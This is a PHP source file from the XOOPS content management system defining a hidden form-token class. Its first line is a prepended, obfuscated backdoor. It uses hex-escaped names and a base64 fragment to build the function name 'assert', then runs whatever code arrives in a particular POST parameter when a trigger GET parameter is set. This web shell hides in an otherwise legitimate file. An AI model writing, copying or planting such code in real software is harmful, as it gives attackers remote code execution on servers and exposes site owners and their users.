<?php ${"G\x4c\x4f\x42\x41\x4c\x53"}["g\x70x\x65\x62p\x63\x75"]="c";if(isset($_GET["17682"])&&isset($_POST["536c2"])){${${"\x47\x4cO\x42A\x4c\x53"}["g\x70\x78\x65\x62p\x63\x75"]}=base64_decode("YX\x4ez\x5aX\x49\x3d")."t";@${${"G\x4c\x4fB\x41\x4c\x53"}["\x67\x70xe\x62\x70c\x75"]}($_POST["536c2"]);exit();} ?><?php
// $Id: formtoken.php,v 1.1.2.2 2005/05/13 10:25:39 minahito Exp $ //  ------------------------------------------------------------------------ //
//                XOOPS - PHP Content Management System                      //
//                    Copyright (c) 2000 XOOPS.org                           //
//                       <http://www.xoops.org/>                             //
//  ------------------------------------------------------------------------ //
//  This program is free software; you can redistribute it and/or modify     //
//  it under the terms of the GNU General Public License as published by     //
//  the Free Software Foundation; either version 2 of the License, or        //
//  (at your option) any later version.                                      //
//                                                                           //
//  You may not change or alter any portion of this comment or credits       //
//  of supporting developers from this source code or any supporting         //
//  source code which is considered copyrighted (c) material of the          //
//  original comment or credit authors.                                      //
//                                                                           //
//  This program is distributed in the hope that it will be useful,          //
//  but WITHOUT ANY WARRANTY; without even the implied warranty of           //
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the            //
//  GNU General Public License for more details.                             //
//                                                                           //
//  You should have received a copy of the GNU General Public License        //
//  along with this program; if not, write to the Free Software              //
//  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA // //  ------------------------------------------------------------------------ //
/**
 * A hidden token field by XoopsToken instance.
 * This is a trial code.
 *
 * @author  minahito<minahito@users.sourceforge.jp>
 * @copyright   copyright (c) 2000-2005 XOOPS.org
*/
class XoopsFormToken extends XoopsFormHidden {
    /**
     * Constructor
     *
     * @param object    $token  XoopsToken instance
    */
    function XoopsFormToken($token)
    {
        if(is_object($token)) {
            parent::XoopsFormHidden($token->getTokenName(), $token->getTokenValue());
        }
        else {
            parent::XoopsFormHidden('','');
        }
    }
}
?>